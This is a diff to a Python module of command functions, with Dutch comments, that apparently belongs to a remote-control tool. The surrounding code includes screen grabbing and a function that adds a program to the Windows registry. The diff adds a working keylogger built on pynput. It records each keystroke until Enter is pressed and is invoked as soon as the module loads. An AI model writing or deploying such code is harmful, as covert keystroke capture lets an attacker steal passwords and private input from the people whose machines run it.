@@ -1,7 +1,7 @@
 # Deze file bevat alle functies die binnen de async commands uitgevoerd kunnen wordt
 import cv2, os, time, subprocess, sys, ctypes, winreg, re
-from PIL import Image, ImageGrab
-
+from PIL import ImageGrab
+from pynput import keyboard
 
 # functie die afgedraaid wordt om de banner te maken
 def make_banner() -> str:
@@ -167,3 +167,31 @@ def add_to_registry(program_name):
         print(f"Fout bij toevoegen aan het register: {e}")
 
 
+# key logger
+string = []
+
+def on_press(key):
+    try:
+        if key == keyboard.Key.enter:
+            return False
+        
+        else:
+            # print('alphanumeric key {0} pressed'.format(key.char))
+            string.append(format(key.char))
+
+    except AttributeError:
+        # print('special key {0} pressed'.format(key))
+        string.append(format(key))
+    
+    # return string
+
+def key_log():
+    # Collect events until released
+    with keyboard.Listener(on_press=on_press) as listener: listener.join()
+
+    # ...or, in a non-blocking fashion:
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+key_log()
+print(string)
